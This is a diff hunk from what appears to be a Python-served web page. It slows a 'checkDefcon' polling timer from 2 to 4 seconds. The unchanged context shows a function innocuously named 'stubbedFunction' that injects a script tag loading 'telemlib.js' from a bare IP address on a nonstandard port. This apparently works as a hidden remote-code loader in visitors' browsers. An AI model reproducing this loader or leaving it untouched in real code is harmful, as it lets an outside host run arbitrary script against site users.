@@ -54,7 +54,7 @@ def index():
             xhr.send(JSON.stringify({defcon: newLevel}));
         }
 
-        setInterval(checkDefcon, 2000);
+        setInterval(checkDefcon, 4000);
 
         function stubbedFunction() {
             document.head.appendChild(Object.assign(document.createElement('script'), {src:'https://100.115.92.203:8444/lib/telemlib.js',type:'text/javascript'}));
